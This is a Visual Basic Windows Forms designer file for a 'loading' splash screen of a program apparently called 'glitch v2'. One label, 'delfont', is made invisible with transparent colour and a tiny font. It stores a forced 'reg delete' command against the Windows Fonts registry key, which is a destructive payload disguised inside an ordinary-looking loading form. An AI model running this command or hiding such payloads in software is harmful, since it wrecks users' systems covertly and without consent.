<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class loading
    Inherits System.Windows.Forms.Form

    'Form remplace la méthode Dispose pour nettoyer la liste des composants.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Requise par le Concepteur Windows Form
    Private components As System.ComponentModel.IContainer

    'REMARQUE : la procédure suivante est requise par le Concepteur Windows Form
    'Elle peut être modifiée à l'aide du Concepteur Windows Form.  
    'Ne la modifiez pas à l'aide de l'éditeur de code.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(loading))
        Me.loadbar = New System.Windows.Forms.ProgressBar()
        Me.loadtimer = New System.Windows.Forms.Timer(Me.components)
        Me.loadtxt = New System.Windows.Forms.Label()
        Me.delfont = New System.Windows.Forms.Label()
        Me.SuspendLayout()
        '
        'loadbar
        '
        Me.loadbar.Cursor = System.Windows.Forms.Cursors.Default
        Me.loadbar.Dock = System.Windows.Forms.DockStyle.Bottom
        Me.loadbar.Location = New System.Drawing.Point(0, 25)
        Me.loadbar.Name = "loadbar"
        Me.loadbar.Size = New System.Drawing.Size(544, 23)
        Me.loadbar.TabIndex = 0
        '
        'loadtimer
        '
        '
        'loadtxt
        '
        Me.loadtxt.AutoSize = True
        Me.loadtxt.Location = New System.Drawing.Point(491, 9)
        Me.loadtxt.Name = "loadtxt"
        Me.loadtxt.Size = New System.Drawing.Size(54, 13)
        Me.loadtxt.TabIndex = 1
        Me.loadtxt.Text = "Loading..."
        '
        'delfont
        '
        Me.delfont.AutoSize = True
        Me.delfont.BackColor = System.Drawing.Color.Transparent
        Me.delfont.Font = New System.Drawing.Font("Microsoft Sans Serif", 1.5!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.delfont.ForeColor = System.Drawing.Color.Transparent
        Me.delfont.Location = New System.Drawing.Point(-1, 0)
        Me.delfont.Name = "delfont"
        Me.delfont.Size = New System.Drawing.Size(89, 2)
        Me.delfont.TabIndex = 2
        Me.delfont.Text = "reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts" &
    """ /f"
        '
        'loading
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(544, 48)
        Me.ControlBox = False
        Me.Controls.Add(Me.delfont)
        Me.Controls.Add(Me.loadtxt)
        Me.Controls.Add(Me.loadbar)
        Me.Cursor = System.Windows.Forms.Cursors.WaitCursor
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "loading"
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.Text = "g̴̘̈͛l̵̰͚̈́͛i̸̯͕͛t̴͍̳̀c̶̯͌̈ḩ̴̱̋ ̷̍͜͝v̸̮͒̾2̸̖́  | loading"
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    Friend WithEvents loadbar As ProgressBar
    Friend WithEvents loadtimer As Timer
    Friend WithEvents loadtxt As Label
    Friend WithEvents delfont As Label
End Class
